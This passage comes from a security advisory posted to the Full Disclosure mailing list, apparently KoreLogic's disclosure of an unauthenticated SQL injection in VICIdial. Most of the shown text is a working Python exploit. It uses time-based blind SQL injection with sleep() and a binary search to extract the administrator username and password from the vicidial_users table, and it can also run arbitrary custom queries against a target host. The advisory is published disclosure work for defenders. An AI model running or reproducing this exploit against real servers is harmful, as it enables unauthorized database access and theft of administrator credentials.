         # sets the best 'sleep' duration based on response times
         def is_vulnerable(self, session, baseline_iterations=5):
             # determine average baseline response time
             zero_sleep_query = f'SELECT (NULL)'
             total_baseline_time = 0
             for _ in range(baseline_iterations):
                 execution_time = self.time_sql_query(zero_sleep_query, session)
                 total_baseline_time += execution_time.total_seconds()

             average_baseline_response_time = total_baseline_time / baseline_iterations
             self.sql_baseline_time = average_baseline_response_time

             # determine if injected sleep query impacts response time
             sleep_length = round(average_baseline_response_time * self.SLEEP_MULTIPLIER, 2)
             sleep_query  = f'SELECT (sleep({sleep_length}))'
             execution_time = self.time_sql_query(sleep_query, session)
             if execution_time.total_seconds() >= sleep_length:
                 self.sql_sleep_length = sleep_length
                 return True
             else:
                 return False

         # determine if a character at a specific indice of a query result returns a
         # boolean 'true' when compared to a given character using the supplied operator
         def check_indice_of_query_result(self, session, query, indice, operator, ordinal):

```
             parent\_query    = f'SELECT IF(ORD((SUBSTRING(({query}), {indice}, {indice}))){operator}{ordinal},
sleep({self.sql\_sleep\_length}), null)'
```

             execution_time  = self.time_sql_query(parent_query, session)
             return execution_time.total_seconds() >= (self.sql_baseline_time * self.SLEEP_MULTIPLIER)

         def enumerate_sql_query(self, session, query='SELECT @@version', charset=string.printable):
             # convert charset to ordinals
             all_characters     = sorted([ord(char) for char in charset])
             reduced_characters = all_characters

             # use a binary search and enumerate query results
             result = ''
             indice = 1
             indice_could_be_null = True
             while True:
                 """
                 we check if the value is NULL once per indice
                 to determine when a string ends. this adds one
                 request per indice, but since every boolean 'true'
                 results in a delay this is faster than counting
                 the length of the string before enumrating.
                 """
                 if indice_could_be_null:
                     if self.check_indice_of_query_result(session, query, indice, '=', '0'):
                         break
                     else:
                         indice_could_be_null = False

                 # enumerate each character of query result with a binary search
                 middle_indice  = len(reduced_characters) // 2
                 middle_ordinal = reduced_characters[middle_indice]
                 if self.check_indice_of_query_result(session, query, indice, '<=', middle_ordinal):
                     if self.check_indice_of_query_result(session, query, indice, '=', middle_ordinal):
                         reduced_characters = all_characters
                         result += chr(middle_ordinal)
                         indice += 1
                         indice_could_be_null = True
                         print(f'[~] {result}')
                     else:
                         reduced_characters = reduced_characters[:middle_indice]
                 else:
                     reduced_characters = reduced_characters[middle_indice:]

             return result

         # returns administrator username and password by
         # exploiting time-based SQL injection.
         def extract_admin_credentials(self, session):
             print('[~] Enumerating administrator credentials')
             username_charset = string.ascii_letters + string.digits

```
             admin\_username\_query = "SELECT user FROM vicidial\_users WHERE user\_level = 9 AND modify\_same\_user\_level =
'1' LIMIT 1"
```

             admin_username = self.enumerate_sql_query(session, admin_username_query, username_charset)
             print(f'[+] Username: {admin_username}')

             password_charset = string.ascii_letters + string.digits + '-.+/=_'
             admin_password_query = f"SELECT pass FROM vicidial_users WHERE user = '{admin_username}' LIMIT 1"
             admin_password = self.enumerate_sql_query(session, admin_password_query, password_charset)
             print(f'[+] Password: {admin_password}')

             return admin_username, admin_password

         # injects SQL queries and enumerates results if instance is vulnerable
         def exploit(self, custom_query=None):
             session = self.build_requests_session()
             is_vulnerable = self.is_vulnerable(session)
             if is_vulnerable:
                 print('[+] Target appears vulnerable to time-based SQL injection')
             else:
                 print('[-] Failed to perform time-based SQL injection')
                 return

             if custom_query:
                 print(f'[~] Executing SQL: {custom_query}')
                 self.enumerate_sql_query(session, custom_query)
             else:
                 self.extract_admin_credentials(session)

     if __name__ == '__main__':
         argparser = argparse.ArgumentParser(description='Exploit for CVE-2024-XXXXX: Unauthenticated SQLi')
         required  = argparser.add_argument_group('Required Arguments')
         optional  = argparser.add_argument_group('Optional Arguments')
         required.add_argument('-rh', '--rhost', required=True, help='Vicidial Server IP address')
         required.add_argument('-rp', '--rport', required=True, help='Vicidial Server port number')

```
         optional.add\_argument('-q',  '--query', required=False, help='Custom SQL query to execute',
default=None)
         optional.add\_argument('-p',  '--proxy', required=False, help='HTTP[S] proxy to use for outbound requests',
default=None)
```

         arguments = argparser.parse_args()

         exploit = Exploit(
             rhost = arguments.rhost,
             rport = arguments.rport,
             proxy = arguments.proxy
         )
         exploit.exploit(custom_query=arguments.query)

The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
<http://creativecommons.org/licenses/by-sa/4.0/>

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
<https://www.korelogic.com/about-korelogic.html>

Our public vulnerability disclosure policy is available at:
<https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy>

```

**Attachment:
[OpenPGP\_signature.asc](att-25/OpenPGP_signature_asc.bin)**

*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

### Current thread:

* **KL-001-2024-011: VICIdial Unauthenticated SQL Injection** *KoreLogic Disclosures via Fulldisclosure (Sep 10)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


